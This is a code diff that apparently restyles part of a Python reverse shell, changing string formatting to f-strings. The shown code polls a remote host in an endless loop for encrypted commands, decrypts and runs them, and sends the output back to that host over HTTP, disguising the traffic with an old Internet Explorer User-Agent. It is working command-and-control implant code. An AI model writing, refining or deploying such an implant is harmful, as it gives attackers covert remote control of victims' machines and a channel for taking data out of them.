@@ -102,7 +102,7 @@ except IndexError:
 # loop forever
 while 1:
     # open up our request handelr
-    req = urllib.request.Request('http://%s:%s' % (address, port))
+    req = urllib.request.Request(f'http://{address}:{port}')
     # grab our response which contains what command we want
     message = urllib.request.urlopen(req)
     # base64 unencode
@@ -110,7 +110,7 @@ while 1:
     # decrypt the communications
     message = DecodeAES(cipher, message)
     # quit out if we receive that command
-    if message == "quit" or message == "exit":
+    if message in ["quit", "exit"]:
         sys.exit()
     # issue the shell command we want
     message = message.replace("{", "")
@@ -125,7 +125,7 @@ while 1:
     # urlencode the data from stdout
     data = urllib.parse.urlencode({'cmd': '%s'}) % (data)
     # who we want to connect back to with the shell
-    h = http.client.HTTPConnection('%s:%s' % (address, port))
+    h = http.client.HTTPConnection(f'{address}:{port}')
     # set our basic headers
     headers = {"User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",
                "Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
